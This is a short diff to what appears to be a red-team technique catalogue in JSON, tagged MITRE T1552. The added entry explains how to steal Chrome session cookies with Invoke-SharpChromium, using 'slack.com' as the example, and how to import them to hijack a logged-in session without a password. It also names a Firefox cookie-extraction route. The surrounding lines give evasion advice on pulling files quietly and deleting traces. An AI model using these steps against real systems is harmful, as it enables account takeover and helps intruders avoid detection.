@@ -96,5 +96,6 @@
       "MITRE T1552"
     ],
     "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-  }
+  },
+  "explain": "Steals browser session cookies to hijack authenticated web sessions:\n  Invoke-SharpChromium     SharpChromium loader\n  -Command \"cookies slack.com\"   extract Chrome cookies for this domain (e.g. a Slack session)\nImport the stolen cookie into your own browser to ride the session without a password. For Firefox, copy cookies.sqlite and use cookieextractor.py."
 }
